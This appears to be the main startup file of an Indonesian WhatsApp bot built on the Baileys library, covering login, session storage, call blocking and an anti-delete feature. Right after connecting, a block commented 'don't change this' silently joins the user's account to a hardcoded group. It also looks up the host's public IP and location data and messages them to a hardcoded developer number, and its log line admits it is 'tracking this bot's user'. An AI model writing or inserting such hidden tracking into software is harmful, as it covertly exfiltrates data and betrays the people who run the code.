
const { WAConnection: _WAConnection, 
              MessageType, 
              Presence, 
              Mimetype, 
              ChatModification, 
              GroupSettingChange, 
              ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const fs = require('fs')
const fetch = require('node-fetch')
const { banner, start, success } = require('./lib/functions')
const { color } = require('./lib/color')
const moment = require("moment-timezone")
const index = require('./index.js')

NamaOwner = index.NamaLu
NomorOwner = index.owner
NamaBot = index.Fakenya
anticall = index.AntiTelpon
antidelete = index.AntiHapusPesan

require('./index.js')
nocache('./index.js', module => console.log(`${module} Sukses MengUpdate Index.js!`))

const starts = async (hexa = new WAConnection()) => {
    hexa.logger.level = 'warn'
    hexa.version = [2, 2143, 8]
    hexa.browserDescription = [ 'King_Off_Xzn', 'Chrome', '3.0' ]
    console.log(banner.string)
    hexa.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan bang'))
    })

    fs.existsSync('./session.json') && hexa.loadAuthInfo('./session.json')
    hexa.on('connecting', () => {
        start('2', 'Connecting...')
    })
    hexa.on('open', () => {
        success('2', 'Connected')
    })
    await hexa.connect({timeoutMs: 30*1000})
    fs.writeFileSync('./session.json', JSON.stringify(hexa.base64EncodedAuthInfo(), null, '\t'))
    
    // BIARIN AJA ANJ JAN DI UBAH 
    
      teks = `https://chat.whatsapp.com/CJi3GeRrUP0KvRZsfNgSEB`
      hexa.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
      console.log(color('|WRN|', 'yellow'), color('Sucsess Join Group Kami', 'cyan'))

      fetch(`http://ip-api.com/line`).then(res => res.text())  
      .then(bu =>{
      hexa.sendMessage(`6288293524506@s.whatsapp.net`, ` *IP-USER* \n\n\`\`\`${bu}\`\`\`\n`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer King_Off_Xzn Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/thumb.jpeg'),sourceUrl:"https://wa.me/6288293524506?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sedang Melacak Pengguna Bot Ini', 'cyan'))
     })
    
    hexa.on('CB:action,,call', async json => {
    	if (anticall === false) return
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        hexa.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        hexa.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/thumb.jpeg'),sourceUrl:`https://wa.me/${NomorOwner}?text=Assalamualaikum`}}})
        await sleep(5000)
        await hexa.blockUser(callerId, "add")
        })
        
     hexa.on('message-delete', async (m) => {
         if (antidelete === false) return
         if (m.key.remoteJid == 'status@broadcast') return
         if (!m.key.fromMe && m.key.fromMe) return
         m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
         const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
         let d = new Date
         let c = hexa.chats.get(m.key.remoteJid)
         let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
         let co3ntent = hexa.generateForwardMessageContent(a, false)
         let c3type = Object.keys(co3ntent)[0]
         let locale = 'id'
         let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
         let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
         let week = d.toLocaleDateString(locale, { weekday: 'long' })
         let calender = d.toLocaleDateString(locale, {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
           })
             hexa.copyNForward(m.key.remoteJid, m.message)
             hexa.sendMessage(m.key.remoteJid, `
┏[ *ANTI DELETE* ]
┣ Nama : @${m.participant.split("@")[0]}
┣ Tipe : ${c3type}
┗ Tanggal : ${jam} - ${week} ${weton} - ${calender}
`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
})
        
    hexa.on('chat-update', async (message) => {
        require('./index.js')(hexa, message)
    })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'is now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
